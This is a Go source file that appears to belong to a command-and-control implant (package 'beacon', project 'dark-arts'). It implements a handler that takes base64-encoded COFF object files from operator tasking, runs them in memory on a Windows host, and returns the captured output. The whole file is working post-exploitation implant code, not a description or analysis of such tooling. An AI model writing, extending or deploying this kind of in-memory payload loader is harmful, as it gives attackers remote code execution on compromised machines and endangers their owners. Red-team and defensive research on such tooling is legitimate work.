//go:build windows && amd64

package beacon

import (
	"bytes"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"strings"

	"dark-arts/pkg/bof"
	"dark-arts/pkg/tasking"
)

func (e *Executor) runBOF(payload []byte, res *tasking.Result) {
	var p struct {
		Data string `json:"data"`
		Fn   string `json:"fn"`
		Args string `json:"args"`
	}
	if err := json.Unmarshal(payload, &p); err != nil {
		res.Error = err.Error()
		return
	}
	if p.Data == "" {
		res.Error = "beacon: bof requires base64 data"
		return
	}
	coffBytes, err := base64.StdEncoding.DecodeString(p.Data)
	if err != nil {
		res.Error = "beacon: bof data is not valid base64: " + err.Error()
		return
	}
	if len(coffBytes) == 0 {
		res.Error = "beacon: bof data is empty after decode"
		return
	}

	fn := p.Fn
	if fn == "" {
		fn = "go"
	}
	var args []string
	if p.Args != "" {
		args = strings.Fields(p.Args)
	}

	var buf bytes.Buffer
	bof.SetBeaconCallbacks(
		func(format string, fargs ...interface{}) {
			buf.WriteString(fmt.Sprintf(format, fargs...))
		},
		func(data []byte) {
			buf.Write(data)
		},
	)
	defer bof.SetBeaconCallbacks(nil, nil)

	if _, err := bof.ExecuteCOFF(coffBytes, fn, args); err != nil {
		res.Error = err.Error()
		return
	}
	if buf.Len() > 0 {
		res.Output = buf.Bytes()
	}
}
